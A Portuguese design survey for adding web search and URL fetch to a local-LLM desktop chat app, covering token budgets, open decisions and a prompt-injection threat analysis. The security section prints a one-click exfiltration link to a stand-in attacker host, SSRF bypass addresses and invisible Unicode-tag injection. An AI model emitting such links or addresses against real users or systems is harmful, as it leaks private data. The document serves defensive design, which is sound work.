# Busca web — levantamento do arco 22

> **Status: levantamento em andamento, nada decidido.** Material de **entrada** do arco 22, reunido em 14/09/2026. Substitui a *Feature 1* de [`web-fetch-mcp-thinking/README.md`](../web-fetch-mcp-thinking/README.md), cuja premissa — *tool calling* como espinha dorsal — já foi derrubada duas vezes, pelo arco 21 e pelo arco 23.
>
> ⚠️ **Este documento não recorta cortes de plano.** O recorte depende de duas decisões que ainda não foram tomadas (`DW-1` e `DW-4`), e recortar antes seria desenhar contra requisito imaginado. Ver [`decisoes.md`](decisoes.md).

| Anexo | O que guarda |
|---|---|
| [`api.md`](api.md) | as duas rotas campo a campo, o custo medido em tokens, a cota, e os cinco candidatos alternativos |
| [`seguranca.md`](seguranca.md) | o que o app já defende, a lacuna que este pilar abre, e o checklist de doze itens |
| [`painel.md`](painel.md) | o layout em esquema plaintext, com as bifurcações lado a lado |
| [`decisoes.md`](decisoes.md) | **as 29 decisões `DW-<n>` a tomar**, agrupadas, cada uma com base e recomendação |

---

## 1. O achado que reorganiza o pilar: são duas operações, não uma

O repositório usa a palavra *"busca"* em dois sentidos, e isso passou despercebido porque nenhum dos dois tinha código.

| | `web_search` | `web_fetch` |
|---|---|---|
| Entrada | uma **pergunta** | uma **URL** |
| Quem escolhe a fonte | o índice do provedor | a pessoa |
| O que sai da máquina | **a pergunta, como escrita** | só o endereço |
| Custo | **~2.100 tokens por resultado** | ~1.550 tokens na página medida |
| Botão de custo | `max_results` (1–10) | nenhum |

- O [`ESCOPO.md`](../../ESCOPO.md) define o pilar como *"uma URL vira contexto da resposta"* — isso é **`fetch`**.
- O interruptor que já está na tela se chama **`Busca web`** — isso é **`search`**.

⚠️ **A conta da Ollama já trata as duas como coisas separadas:** `web search` e `web fetch` aparecem como **linhas próprias** no painel de uso, ao lado dos modelos (medido na sondagem de 13/09). Não é detalhe de implementação — é a própria fronteira do pilar, e está registrada como `DW-1`.

---

## 2. O que já existe no app, e que ninguém precisa construir de novo

Verificado lendo o fonte em 14/09/2026 — não suposto.

| Peça | Estado |
|---|---|
| O interruptor `Busca web` no menu `+` | existe, `disabled`, `checked: false` fixo (`AttachMenu.tsx`, `TOOLS[0]`) |
| A chave da Ollama no cofre | **já guardada** — `'ollama-cloud'` entrou em `CloudProvider` no `N-3-C` |
| O molde de painel para conteúdo de fora | `docs` (arco 23) — `SidePanel`, `Tabs`, seleção por item, `omitted`, `enabled` por turno |
| A região da direita com um inquilino por vez | `features/panel/`, invariante de construção (`DE1B.1`) |
| Exfiltração por imagem markdown | ✅ **já bloqueada em duas camadas independentes** — ver § 5 |
| Link de conteúdo externo | ✅ já passa por `checkExternalUrl` e abre por `shell.openExternal`, nunca navega |
| Guarda de SSRF | ❌ **não existe** — e `checkExternalUrl` **não** é um |

---

## 3. O que se pode controlar, e o que não se pode

A pergunta do pedido — *"quero o máximo de controle, como a documentação hoje propõe: eu escolho exatamente o que entra no contexto"*.

### Controlável, e no mesmo grau que o Context7 hoje

| | Como |
|---|---|
| **Quando acontece** | só por ato explícito da pessoa. Não há *tool calling* no app; modelo nenhum aciona nada |
| **Qual a fonte** | no `fetch`, a URL é escolhida. Na busca, não — ver abaixo |
| **Quantos resultados** | `max_results`, 1 a 10, linear em custo |
| **O que entra no contexto** | seleção item a item no painel, com o custo em tokens por item |
| **O que fica de fora** | persiste como título e custo, **nunca o conteúdo** (molde `D23C.3`) |
| **Por quanto tempo pesa** | o `[●─]` por consulta tira do reenvio **sem apagar da transcrição** |
| **A granularidade da seleção** | ⚠️ **a decidir** — resultado inteiro ou seção de markdown (`DW-12`) |

### Não controlável, e é honesto dizer

| | Por quê |
|---|---|
| **Quais páginas o índice devolve** | é um índice de terceiro. Não há relevância ajustável, nem filtro por domínio na API |
| **Como o texto foi extraído** | o `content` chega **já em markdown**, limpo do lado do provedor. Trazer a extração para dentro é possível, e custa `jsdom` em produção (`DW-4`) |
| **Quanto de cota sobrou** | ⚠️ **não há header de cota. Nenhum.** E o painel da conta não é instrumento de medida — quatro leituras se contradizem. Diferente do Context7, aqui **não existe número a exibir** |
| **Se a pergunta sai da máquina** | sai. **Inclusive em conversa 100% local** — é o mesmo rompimento que o Context7 já fez, e na busca o que sai é a pergunta como escrita |

---

## 4. Poupar token num modelo local — a aritmética contra o `qwen3.5`

O padrão de trabalho é a dupla `qwen3.5` (`2b`, 2,55 GB; `4b`, 3,16 GB). O teto treinado é 262.144, mas **esta máquina não aguenta isso** — quem decide é `contextCeiling`, e o default do app é `DEFAULT_NUM_CTX = 32768`.

Partindo de 32.768, com `REASONING_OUTPUT_RESERVE_RATIO = 0.35` reservado para geração, sobram **~21.300 tokens** de espaço de prompt. Contra isso:

| O que entra | Tokens | % do espaço de prompt |
|---|---:|---:|
| `web_fetch` de uma página média | ~1.550 | **7 %** |
| `web_search` com `max_results: 1` | ~2.100 | **10 %** |
| `web_search` com `max_results: 3` | ~6.960 | **33 %** |
| `web_search` com `max_results: 5` (o default da API) | ~10.400 | **49 %** |
| `web_search` com `max_results: 10` | ~20.900 | ⚠️ **98 %** |

⚠️ **O default da API é 5, e 5 consome metade do orçamento de prompt desta máquina.** Se o app não escolher `max_results` explicitamente, ele herda um default desenhado para janelas de nuvem. **Este é o número que mais pesa no desenho do painel.**

⚠️ **E o custo é por turno, não por consulta.** Toda parte é remontada e reenviada a cada mensagem (`partForProvider`). Uma busca de 6.960 tokens ligada custa 6.960 na primeira mensagem **e em todas as seguintes** — é o que torna o `[●─]` de desligar o botão de economia mais importante do pilar, e não um conforto.

**Os cinco botões de economia, em ordem de efeito:**

1. **Desligar a consulta depois de usada** — tira do reenvio, mantém na transcrição
2. **`max_results` baixo** — o único botão da própria API, e linear
3. **Seleção por seção em vez de por resultado** — a decisão `DW-12`; o que muda o grão de ~2.100 para ~200–800
4. **Preferir `fetch` a `search` quando a URL já é conhecida** — 7 % contra 33 %
5. **Memo de sessão** — não poupa contexto, poupa **cota e tempo**; e a chave dele precisa conter `max_results`, ou repete o sucesso silencioso de `D23J.4`

⚠️ **Os números desta seção são estimativa, e a razão está declarada:** a conversão usa `DEFAULT_CHARS_PER_TOKEN = 3.8`, porque **nada tokeniza antes de enviar** — a contagem exata só existe depois, no `prompt_eval_count`. Trate como ordem de grandeza; o app se auto-corrige por `calibrateRatio` em runtime.

🔍 **Não medido, e vale medir antes de fixar o painel:** o custo em **tempo** de prefill. O único número que o repositório tem é ~23 tok/s para `gemma3:4b` nesta CPU; nessa ordem de grandeza, 6.960 tokens seriam minutos de espera por turno. O reaproveitamento de cache KV do llama.cpp deve absorver boa parte disso quando o prefixo não muda, mas **isso não foi medido aqui** e a posição da consulta na história decide se o cache vale.

---

## 5. Segurança — o arco 22 é o que fecha a trifecta letal

Levantamento completo, revisado em profundidade, em [`seguranca.md`](seguranca.md). A síntese:

**O enquadramento que reordena tudo o mais.** A trifecta letal (Willison, jun/2025) e a *Rule of Two* (Meta, out/2025): um agente pode ter no máximo **duas** de três propriedades sem supervisão humana.

| Perna | `crivo` **hoje** | **com busca web** |
|---|---|---|
| **A** · dados privados | ✅ **sim, e muito** — planilha, PDF, imagem da máquina | ✅ sim |
| **B** · conteúdo não confiável | ⚠️ parcial — só documentação indexada (Context7) | ❌ **plena e arbitrária** |
| **C** · comunicação externa | ⚠️ **parcial, e mais aberta do que parecia** | ⚠️ igual |

⚠️ **O arco 22 é precisamente o que promove a perna B.** A pergunta de segurança do arco não é *"como filtrar injeção?"* — é **qual perna fica de fora**, e a resposta natural aqui é **C**, porque o app já está a dois consertos de lá.

**✅ O que já está bem, e é acima da média do mercado:**

1. **Exfiltração de zero clique por imagem markdown está morta, em duas camadas.** `urlTransform` devolve `null` para `key === 'src'`, e a CSP recusaria de qualquer forma. ⚠️ Mas a camada 1 **não foi escrita contra esse ataque** — ela acerta por consequência, e quem "consertar" as imagens remotas um dia remove uma defesa sem saber (`DW-29`).
2. **Não há loop de *tool calling*.** Conteúdo hostil não encontra ação para disparar.

**❌ Os dois furos que a revisão profunda encontrou, e que valem qualquer que seja a resposta de `DW-4`:**

1. **A exfiltração de UM clique está aberta.** `checkExternalUrl` aprova qualquer `https:`, então `[Clique aqui para continuar](https://atacante.tld/?d=<dados>)` vira link clicável com texto enganoso — e um clique chama `shell.openExternal`. É o caso corrigido pela AWS no Amazon Q e o `ChatGPhish` no ChatGPT (`DW-23`). ⚠️ **Este conserto não depende do arco 22 e já vale hoje**, porque o Context7 já traz texto de fora.
2. **Caractere Unicode invisível atravessa o painel.** O bloco Unicode Tags (`U+E0000`–`U+E007F`) renderiza como nada e é lido normalmente pelo modelo — detecções subiram **~100×** desde fev/2026. **Isso derruba a premissa de que "a pessoa vê o que entra no contexto"**: ela vê o que *renderiza* (`DW-24`).

**❌ E a lacuna de SSRF, se o app buscar direto.** `checkExternalUrl` valida **só o esquema** — e está certa assim, porque o risco dela é `shell.openExternal` invocar um handler local do SO (o mesmo `CVE-2026-43941`). Passam por ela: `http://2130706433/` (decimal), `http://[::ffff:127.0.0.1]/` (IPv4-mapped), redirect para IP privado, e DNS rebinding.

⚠️ **A tentação a nomear:** *"já existe `checkExternalUrl`, é só chamar"*. Não é, e **estendê-la é pior** — duas ameaças, uma função, quatro chamadores.

⚠️ **Delegar a busca elimina o SSRF contra esta máquina, e não elimina o vazamento.** Mandar `file:///C:/Users/<nome>/…` ao `web_fetch` da Ollama entrega o nome de usuário do Windows mesmo falhando lá.

---

## 6. As decisões em aberto — o índice

As 29, em [`decisoes.md`](decisoes.md). As **cinco que travam tudo o mais**:

| | Pergunta | Por que trava |
|---|---|---|
| **`DW-26`** | **qual perna da trifecta fica de fora?** | ⚠️ **a decisão-quadro** — reordena todas as outras. Entra com número alto porque a numeração é `append-only`, e a revisão profunda de segurança veio depois |
| **`DW-1`** | o pilar entrega busca, abertura de URL, ou as duas? | decide o contrato, o painel e o vocabulário |
| **`DW-4`** | quem executa: Ollama, o app, SearXNG, ou híbrido? | decide se o guarda de SSRF é o primeiro trabalho ou uma validação de saída |
| **`DW-12`** | a caixa de marcação é por resultado ou por seção? | é a decisão de *controle* do pedido, e a que cria (ou não) um particionador de markdown próprio |
| **`DW-2`** | o interruptor `Busca web` vira item de anexo? | o precedente `DM-29` diz que sim; o interruptor já construído diz que não |

⚠️ **Duas decisões não esperam o arco:** `DW-23` (host do link visível antes de abrir) e `DW-24` (remover Unicode invisível na entrada) valem **hoje** — o Context7 já traz texto de fora e `MarkdownMessage` já o renderiza. Entregues sozinhas, deixariam o app mais seguro do que está agora.

---

## 7. Metodologia e proveniência

| Fonte | O que veio dela | Data |
|---|---|---|
| Sondagem própria contra `ollama.com` | as duas rotas, os tamanhos de `content`, a ausência de header de cota, as linhas do painel | 13/09/2026 ([`ollama-cloud/capacidades.md`](../ollama-cloud/capacidades.md)) |
| Doc oficial via **Context7** e leitura direta | `max_results` default 5 / máx 10, auth Bearer, shape das respostas | 14/09/2026 |
| **Busca web** | fim do plano gratuito da Brave (fev/2026), aquisição da Tavily, preço da Exa, estado da literatura de injeção indireta, exfiltração por imagem markdown, SSRF/DNS rebinding | 14/09/2026 |
| **Busca web — revisão profunda de segurança** | trifecta letal e *Rule of Two*; os seis padrões de desenho (arXiv 2506.08837); *spotlighting* com os números medidos (arXiv 2403.14720); Unicode Tags com a alta de 100× desde fev/2026; exfiltração de **um clique** por link (Amazon Q, `ChatGPhish`); encodings de SSRF e o padrão de fixar o IP; bomba de descompressão; `CVE-2026-43941` (`shell.openExternal`); `LLM01`/`LLM02` do OWASP | 14/09/2026 |
| **Context7** (2ª rodada) | checklist de segurança do Electron; `connect.lookup`, `interceptors.redirect`, `maxResponseSize` do `undici` | 14/09/2026 |
| Leitura do fonte deste repositório | `AttachMenu.tsx`, `core/url.ts`, `MarkdownMessage.tsx`, `index.html`, `core/ai/messages.ts`, `shared/ipc.ts`, `main/features/context7/quota.ts` | 14/09/2026 |

⚠️ **A URL da doc oficial mudou entre a sondagem e este levantamento** — `docs.ollama.com/web-search` responde **404**; o caminho vivo é `docs.ollama.com/capabilities/web-search`.

⚠️ **Sondar consome a mesma cota que usar**, e não há saldo legível para saber quanto sobrou. As seis requisições às ferramentas web da sondagem de 13/09 aparecem no painel da conta como `web search: 4` e `web fetch: 2`.
